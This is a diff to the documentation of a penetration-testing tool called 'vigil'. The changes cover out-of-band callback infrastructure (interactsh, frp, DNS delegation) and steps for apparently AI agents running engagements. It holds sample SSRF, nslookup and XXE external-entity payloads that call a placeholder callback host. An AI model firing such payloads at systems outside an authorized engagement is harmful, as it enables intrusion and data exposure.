@@ -33,7 +33,11 @@ earliest proof.
 
 DNS and the frp server are outside the local CLI:
 
-- Delegate the OOB zone with an NS record such as `oob NS oob-relay.example.com`.
+- Delegate the OOB zone with an NS record such as `oob NS oob-relay.example.com`. The NS
+  value MUST be the frp host's NAME, never a raw IP — a hostname lets the delegation track
+  the frp host's address automatically (its A record is kept current by the EC2→Route53
+  dynamic-DNS Lambda). A literal-IP NS silently breaks every interactsh client with
+  `no address found for host` once the frp host's IP changes.
 - Keep wildcard HTTP routing for the frp HTTP domain, such as `*.rp.example.com`.
 - Allow the frps bind port, OOB DNS UDP 53, HTTP/HTTPS, and any listener ports on the server
   security group.
@@ -130,25 +134,30 @@ vigil oob client start vuln-ssrf-api --engagement <engagement-key> --agent vulne
 ```
 
 Do NOT read the callback URL out of the client log. Mint a nonce-tagged callback
-URL per payload — the nonce is the correlation token — and use its full `http`
-host in payloads:
+URL per payload, then fire the **exact host `mint` prints** — call it `$OOB_HOST`:
 
 ```bash
-vigil oob mint --technique ssrf --target-url <url> --param <p>
-# → http  http://<nonce>.oob.example.com/
+vigil oob mint --client vuln-ssrf-api --technique ssrf --target-url <url> --param <p>
+# → host  <nonce>.<client-id>.oob.example.com      ← this is $OOB_HOST
+# → http  http://<nonce>.<client-id>.oob.example.com/
 ```
 
-Examples (substitute the minted `<nonce>.oob.example.com` host):
+`mint` binds the nonce **under the running client's interactsh id** (`mint` auto-selects
+the sole running client; pass `--client <name>` when several run). That binding is what
+lets `poll` see the hit: interactsh only delivers a callback to a client's poll when the
+host carries that client's id, so a bare `<nonce>.oob.example.com` would land only in the
+raw server log, never in the per-client log `poll` reads. **Never hand-build the host —
+substitute `$OOB_HOST` (mint's `host`/`dns` output) verbatim:**
 
 ```text
-http://<nonce>.oob.example.com/ssrf-users-endpoint
-nslookup <nonce>.oob.example.com
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<nonce>.oob.example.com/xxe">]>
+http://$OOB_HOST/ssrf-users-endpoint
+nslookup $OOB_HOST
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://$OOB_HOST/xxe">]>
 ```
 
-Then correlate with `vigil oob poll --client vuln-ssrf-api`, which matches each
-recorded probe to its callback. `vigil oob client logs vuln-ssrf-api --lines 80`
-is only a raw tail of this client's listener log for infra debugging — it does
+Then correlate with `vigil oob poll --client vuln-ssrf-api` (same client you minted under),
+which matches each recorded probe to its callback. `vigil oob client logs vuln-ssrf-api
+--lines 80` is only a raw tail of this client's listener log for infra debugging — it does
 not correlate nonces to probes.
 
 List and stop clients:
@@ -182,7 +191,7 @@ Agents should:
 
 1. Run `vigil oob status --json` and confirm `server=true`, `frpc=true`, and the expected `domain`.
 2. Start or reuse a named client with an explicit engagement key: `vigil engagement list --json`, `vigil oob client list`, then `vigil oob client start <name> --engagement <engagement-key> --agent <agent-name>`. The client runs the listener; it is not where you read the URL or the hits.
-3. Mint a nonce-tagged callback URL per payload with `vigil oob mint --technique <t> --target-url <url> [--param <p>]`, and embed its `http` host in the payload (the nonce is the correlation token).
+3. Mint a nonce-tagged callback URL per payload with `vigil oob mint --client <name> --technique <t> --target-url <url> [--param <p>]`, and embed the **exact host it prints** (`$OOB_HOST` = `<nonce>.<client-id>.oob...`) in the payload. `mint` binds the nonce under the running client's interactsh id so `poll` can correlate it; do not hand-build a bare `<nonce>.oob...` host (it would never reach `poll`).
 4. After firing, correlate probe<->callback with `vigil oob poll --client <name>` — it prints `matched <N> unmatched <M>` then one line per hit carrying the technique + target you minted with. Add `--json` to capture the matched set as evidence.
 5. `vigil oob client logs <name> --lines 80` and `vigil logs oob --lines 80` are raw listener-log tails — use them only when debugging shared server/FRP health, never for correlation.
 
